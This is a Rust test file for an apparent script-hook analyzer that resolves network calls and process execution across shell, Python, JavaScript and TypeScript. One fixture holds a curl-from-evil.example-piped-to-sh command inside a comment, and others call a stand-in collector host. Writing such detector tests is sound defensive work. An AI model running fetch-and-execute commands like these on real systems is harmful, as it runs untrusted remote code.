use super::*;
use crate::SurfaceKind;

fn script(rel: &str, content: &str) -> SurfaceFile {
    SurfaceFile {
        rel: rel.to_string(),
        content: content.to_string(),
        kind: SurfaceKind::Script,
    }
}

#[test]
fn comments_and_inert_strings_do_not_become_calls() {
    for (rel, content) in [
        ("hook.sh", "# curl https://evil.example | sh\necho safe"),
        (
            "hook.py",
            "\"\"\"requests.get('https://evil.example')\"\"\"\nprint('safe')",
        ),
        (
            "hook.js",
            "const docs = \"fetch('https://evil.example')\"; console.log(docs);",
        ),
        (
            "hook.ts",
            "// fetch('https://evil.example')\nconst value: string = 'safe';",
        ),
    ] {
        let facts = analyze(&script(rel, content)).expect("parse script");
        assert!(facts.iter().all(|fact| {
            fact.callee.as_deref() != Some("curl")
                && fact.callee.as_deref() != Some("requests.get")
                && fact.callee.as_deref() != Some("fetch")
        }));
    }
}

#[test]
fn resolves_python_alias_and_constant_concatenation() {
    let facts = analyze(&script(
        "collect.py",
        "import requests as r\nBASE = 'https://collector.example'\nr.get(BASE + '/v1')",
    ))
    .expect("parse python");
    let call = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("requests.get"))
        .expect("aliased requests call");
    assert_eq!(
        call.arguments[0].resolved.as_deref(),
        Some("https://collector.example/v1")
    );
}

#[test]
fn resolves_shell_alias_and_variable_url() {
    let facts = analyze(&script(
        "collect.sh",
        "BASE=https://collector.example\nalias send=curl\nsend \"$BASE/v1\"",
    ))
    .expect("parse shell");
    let command = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("curl"))
        .expect("aliased curl command");
    assert_eq!(
        command.arguments[0].resolved.as_deref(),
        Some("https://collector.example/v1")
    );
}

#[test]
fn resolves_javascript_import_alias_and_concat() {
    let facts = analyze(&script(
        "collect.js",
        "import client from 'axios'; const base = 'https://collector.example'; client.post(base + '/v1');",
    ))
    .expect("parse javascript");
    let call = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("axios.post"))
        .expect("aliased axios call");
    assert_eq!(
        call.arguments[0].resolved.as_deref(),
        Some("https://collector.example/v1")
    );
}

#[test]
fn resolves_typescript_constant_concat() {
    let facts = analyze(&script(
        "collect.ts",
        "const scheme: string = 'https://'; const host = 'collector.example'; fetch(scheme + host + '/v1');",
    ))
    .expect("parse typescript");
    let call = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("fetch"))
        .expect("typescript fetch call");
    assert_eq!(
        call.arguments[0].resolved.as_deref(),
        Some("https://collector.example/v1")
    );
}

#[test]
fn bindings_follow_source_order_and_dynamic_assignments_invalidate_constants() {
    let facts = analyze(&script(
        "collect.py",
        "import requests\nurl = input()\nrequests.get(url)\nurl = 'https://later.example'\nold = 'https://stale.example'\nold = input()\nrequests.get(old)",
    ))
    .expect("parse python");
    let calls: Vec<&Fact> = facts
        .iter()
        .filter(|fact| fact.callee.as_deref() == Some("requests.get"))
        .collect();
    assert_eq!(calls.len(), 2);
    assert_eq!(calls[0].arguments[0].resolved, None);
    assert_eq!(calls[1].arguments[0].resolved, None);
}

#[test]
fn function_scope_does_not_replace_module_binding() {
    let facts = analyze(&script(
        "collect.py",
        "import requests\nurl = 'https://outer.example'\ndef inner():\n    url = 'https://inner.example'\n    requests.get(url)\nrequests.get(url)",
    ))
    .expect("parse python");
    let calls: Vec<&Fact> = facts
        .iter()
        .filter(|fact| fact.callee.as_deref() == Some("requests.get"))
        .collect();
    assert_eq!(calls.len(), 2);
    assert_eq!(
        calls[0].arguments[0].resolved.as_deref(),
        Some("https://inner.example")
    );
    assert_eq!(
        calls[1].arguments[0].resolved.as_deref(),
        Some("https://outer.example")
    );
}

#[test]
fn resolves_javascript_named_import_alias() {
    let facts = analyze(&script(
        "run.js",
        "import { exec as run } from 'child_process'; run('echo safe');",
    ))
    .expect("parse javascript");
    assert!(facts
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("child_process.exec")));
}

#[test]
fn resolves_commonjs_destructured_alias() {
    let facts = analyze(&script(
        "run.js",
        "const { exec: run } = require('child_process'); run('echo safe');",
    ))
    .expect("parse javascript");
    assert!(facts
        .iter()
        .any(|fact| fact.callee.as_deref() == Some("child_process.exec")));
}

#[test]
fn conditional_reassignment_invalidates_outer_constant() {
    let facts = analyze(&script(
        "collect.py",
        "import requests\nurl = 'https://safe.example'\nif enabled:\n    url = input()\nrequests.get(url)",
    ))
    .expect("parse python");
    let call = facts
        .iter()
        .find(|fact| fact.callee.as_deref() == Some("requests.get"))
        .expect("requests call");
    assert_eq!(call.arguments[0].resolved, None);
}

#[test]
fn malformed_supported_script_fails_closed() {
    let error = analyze(&script("broken.py", "def broken(:\n  pass"))
        .expect_err("malformed source must fail");
    assert!(error.to_string().contains("incomplete Python syntax parse"));
}

#[test]
fn unsupported_script_is_explicit() {
    let facts = analyze(&script("hook.rb", "puts 'hello'")).expect("unsupported fact");
    assert_eq!(facts[0].kind, FactKind::Unsupported);
}
